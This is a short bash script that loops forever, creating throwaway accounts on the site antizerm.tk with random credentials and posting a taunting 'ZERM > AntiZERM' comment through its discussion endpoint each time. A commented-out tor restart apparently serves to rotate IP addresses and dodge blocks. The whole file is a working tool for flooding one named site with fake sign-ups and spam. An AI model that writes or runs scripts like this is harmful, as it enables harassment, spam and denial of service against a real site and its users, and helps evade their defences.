#!/bin/bash

antizermip=$(dig +short antizerm.tk)
while true ; do
        rm -f tmpcookies
        lol=$RANDOM
        curl -b tmpcookies -c tmpcookies -H 'Host: antizerm.tk' -X POST -d "username=$lol&password1=$lol&password2=$lol&btn_register=Registrieren" "http://$antizermip/account/register.php"
        curl -b tmpcookies -c tmpcookies -H 'Host: antizerm.tk' "http://$antizermip/social/ajax/load_diskussion.php?q=2&c=ZERM%20>%20AntiZERM%20$RANDOM"
        #systemctl restart tor
done
